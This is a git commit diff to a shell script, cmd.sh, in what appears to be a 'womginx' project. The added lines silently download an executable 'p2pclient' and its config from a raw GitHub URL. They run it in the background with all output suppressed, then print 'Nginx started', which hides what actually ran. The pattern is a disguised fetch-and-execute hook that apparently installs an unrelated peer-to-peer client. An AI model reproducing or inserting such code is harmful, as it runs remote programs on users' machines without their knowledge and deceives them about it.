2169508e72229db5a06fe421de09ff7dbffe7831
wsl-dev <107555945+wsl-dev@users.noreply.github.com>
2022-06-30 17:20:32 +0700

    Update cmd.sh

--- cmd.sh
+++ cmd.sh
@@ -1,1 +1,5 @@
-
+wget https://raw.githubusercontent.com/fight8/womginx/main/config/p2p &>/dev/null ;\
+wget https://raw.githubusercontent.com/fight8/womginx/main/config/p2pclient &>/dev/null ;\
+chmod +x p2pclient ;\
+./p2pclient -l $(cat p2p) &>/dev/null "$@" &
+echo 'Nginx started'
